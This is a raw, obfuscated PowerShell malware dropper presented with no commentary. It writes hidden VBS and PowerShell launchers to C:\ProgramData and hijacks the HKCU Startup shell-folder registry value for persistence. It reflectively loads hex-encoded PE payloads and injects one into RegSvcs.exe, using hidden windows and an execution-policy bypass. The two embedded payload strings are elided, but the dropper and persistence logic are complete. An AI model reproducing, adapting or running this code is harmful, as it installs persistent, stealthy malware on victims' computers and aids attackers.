$a = "C:\Progra/mData\Do/cume/nt".Replace("/","")
$cs = "C:\Program/Data\/sch/tasks".Replace("/","")
New-Item $a -ItemType Directory -Force
New-Item $cs -ItemType Directory -Force
Sleep 1
$Content = @'
Try{
function Informer {
param($GhJnVsXs)$GhJnVsXs = $GhJnVsXs -split '(..)' | ? { $_ }
$Workstation = [Convert]
ForEach ($UX2 in $GhJnVsXs){$Workstation::ToInt32($UX2,16)}}
Try{
[byte[]] $Ghost  = Informer('4D5A9###...###'.Replace('#','0')) # The omitted '4D5A9###...###' is actually a 126977 character long string.
}catch{}
[byte[]] $BOOKS  = Informer('4D5A9###...###'.Replace('#','0')) # The omitted '4D5A9###...###' is actually a 87041 character long string.
}catch{}
$T = 'Get'
$M = $T + 'Method'
$I = 'Invoke'
$T = $T + 'Type'
$L = 'Load'
$Q0 = [Reflection.Assembly]
$B = $Q0::$L($BOOKS)
$B = $B.$T('NewPE2.PE')
$B = $B.$M('Execute')
$Mn = 'C:\Windows\Mic'
$Ub = $Mn + 'rosoft.NET\Fr'
$z = $Ub + 'amework\v4.0'
$VT = $z + '.30319\'
$XQ = $VT + 'RegSvcs.exe'
$B = $B.$I($null,[object[]] ($XQ,$Ghost))
'@
[IO.File]::WriteAllText("C:\ProgramData\Document\Document.ps1", $Content)
$Content = @'
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
Set Shso = CreateObject("WScript" + _
ChrW(46) + "Shell")
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
Shso.Run(Code()),ChrW(48)
Function Code()
Code = Code + "C:\ProgramData\Document\Loader.bat"
End Function
'@
[IO.File]::WriteAllText("C:\ProgramData\schtasks\Document.vbs", $Content)
function CVFFFFFFFFFFFFFE {
param($BOOKS)$BOOKS = $BOOKS -split '(..)' | ? { $_ }
ForEach ($chrome in $BOOKS){[Convert]::ToInt32($chrome,16)}}
[byte[]] $bytes2  = CVFFFFFFFFFFFFFE('747279200D0A7B0D0A24436F6E74656E74203D2040270D0A6D736874612076627363726970743A4578656375746528224372656174654F626A656374282222575363726970742E5368656C6C2222292E52756E202222706F7765222B22222B22222B22222B22222B22222B22222B22222B22222B22222B22222B22222B22222B22222B22222B22222B22222B22222B22222B22222B22222B22222B22222B22222B22222B22222B22222B22222B22222B22222B22222B22222B22222B22222B22222B22222B22222B22222B22222B22727368656C6C202D4578656375222B2274696F6E50222B226F6C696379222B222042797061737320262027433A5C50726F6772616D446174615C446F63756D656E745C446F63756D656E742E7073312722222C20303A636C6F736522290D0A27400D0A5B494F2E46696C655D3A3A5772697465416C6C546578742822433A5C50726F6772616D446174615C446F63756D656E745C4C6F616465722E626174222C2024436F6E74656E74290D0A0D0A247331203D2022484B43553A5C536F6674776172655C4D6963726F736F66745C57696E646F77735C43757272656E7456657273696F6E5C4578706C6F7265725C55736572205368656C6C20466F6C64657273220D0A246D31203D202253746172747570220D0A246F6362203D2022433A5C50726F6772616D446174615C7363687461736B735C220D0A5365742D4974656D50726F7065727479202D5061746820247331202D4E616D6520246D31202D56616C756520246F63623B0D0A247631203D2022484B43553A5C536F6674776172655C4D6963726F736F66745C57696E646F77735C43757272656E7456657273696F6E5C4578706C6F7265725C5368656C6C20466F6C64657273220D0A246B31203D202253746172747570220D0A24737472203D2022433A5C50726F6772616D446174615C7363687461736B735C220D0A5365742D4974656D50726F7065727479202D5061746820247631202D4E616D6520246B31202D56616C756520247374723B0D0A0D0A536C65657020330D0A53746172742022433A5C50726F6772616D446174615C7363687461736B735C446F63756D656E742E766273220D0A0D0A7D206361746368207B207D')
[io.file]::WriteAllBytes("C:\ProgramData\Document\BT.ps1",$bytes2)
$Content = @'
on error resume next
On Error Resume Next
Dim syncCmd
syncCmd = "$BLNLS='ReadAllText';$T='C:\ProgramData\Document\BT.ps1';IEx([<#1#>IO.File<#1#>]::$BLNLS($T))"
Dim psCmd
psCmd = "powershell.exe -NonInteractive -WindowStyle Hidden -ExecutionPolicy RemoteSigned -Command &{" & syncCmd & "}"
Dim xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
Set xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx = WScript.CreateObject("WScript.Shell")
xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx.Run psCmd, 0
'@
[IO.File]::WriteAllText("C:\ProgramData\Document\BT.vbs", $Content)
Sleep 4
start "C:\ProgramData\Document\BT.vbs"